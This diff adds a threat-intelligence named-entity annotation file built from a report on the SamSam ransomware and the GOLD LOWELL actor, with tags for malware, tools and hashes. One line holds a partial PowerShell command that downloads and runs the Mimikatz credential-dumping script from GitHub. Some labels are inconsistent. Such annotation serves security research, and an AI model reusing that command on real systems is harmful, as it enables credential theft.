@@ -1,0 +1,88 @@
+Secureworks ® Counter Threat Unit ™ ( CTU ):Organization
+SamSam:Malware
+Samas:Malware
+SamsamCrypt:Malware
+GOLD LOWELL:Threat_Actor
+GOLD LOWELL:Threat_Actor
+SamSam:Malware
+ransomware:Malware_Category
+SamSam:Malware
+GOLD LOWELL:Threat_Actor
+ransomware:Malware_Category
+CTU ™:Organization
+CTU:Organization
+SamSam:Malware
+ransomware:Malware_Category
+ransomware:Malware_Category
+ransomware:Malware_Category
+ransomware:Malware_Category
+GOLD LOWELL:Threat_Actor
+CTU:Organization
+GOLD LOWELL:Threat_Actor
+SamSam:Malware
+ransomware:Malware_Category
+GOLD LOWELL:Threat_Actor
+GOLD LOWELL:Threat_Actor
+CTU:Organization
+GOLD LOWELL:Threat_Actor
+GOLD LOWELL:Threat_Actor
+ransomware:Malware_Category
+ransomware:Malware_Category
+GOLD LOWELL:Threat_Actor
+GOLD LOWELL:Threat_Actor
+GOLD LOWELL:Threat_Actor
+GOLD LOWELL:Threat_Actor
+GOLD LOWELL:Threat_Actor
+GOLD LOWELL:Threat_Actor
+GOLD LOWELL:Threat_Actor
+GOLD LOWELL:Threat_Actor
+GOLD LOWELL:Threat_Actor
+ransomware:Malware_Category
+GOLD LOWELL:Threat_Actor
+GOLD LOWELL:Threat_Actor
+Windows Management Instrumentation:Product
+GOLD LOWELL:Malware
+GOLD LOWELL:Threat_Actor
+GOLD LOWELL:Threat_Actor
+GOLD LOWELL:Threat_Actor
+GOLD LOWELL:Threat_Actor
+GOLD LOWELL:Corporate
+GOLD LOWELL:Threat_Actor
+PowerShell:Product
+WebClient).DownloadString('https://raw.githubusercontent[.]com / mattifestation / PowerSploit / master / Exfiltration / Invoke - Mimikatz.ps1');Invoke:Url
+Mimikatz:Exploit_Kit
+GOLD LOWELL:Threat_Actor
+PsExec:Exploit_Kit
+command and control ( C2 ):Attack_vector
+cmd.exe:Filename
+Windows Cryptography API:Product
+ransomware:Malware_Category
+GOLD LOWELL:Threat_Actor
+GOLD LOWELL:Threat_Actor
+GOLD LOWELL:Threat_Actor
+GOLD LOWELL:Threat_Actor
+Nlbrute.exe:Filename
+RDP brute - force:Exploit_Kit
+GOLD LOWELL:Threat_Actor
+RDP brute - force:Exploit_Kit
+GOLD LOWELL:Threat_Actor
+6d390038003c298c7ab8f2cbe35a50b07e096554:Hash
+RDP brute - force:Exploit_Kit
+GOLD LOWELL:Threat_Actor
+RDP brute - force:Exploit_Kit
+GOLD LOWELL:Threat_Actor
+7e50f6e752b1335cbb4afe5aee93e317:Hash
+RDPWrap:Exploit_Kit
+GOLD LOWELL:Threat_Actor
+f69a4f9407f0aebf25576a4c9baa609cb35683d1:Hash
+RDPWrap:Malware
+GOLD LOWELL:Threat_Actor
+RDPWrap:Malware
+GOLD LOWELL:Threat_Actor
+58b39bb94660958b6180588109c34f51:Hash
+SamSam:Malware
+7d21c1fb16f819c7a15e7a3343efb65f7ad76d85:Hash
+SamSam:Malware
+88e344977bf6451e15fe202d65471a5f75d22370050fe6ba4dfa2c2d0fae7828:Hash
+SamSam:Malware
+
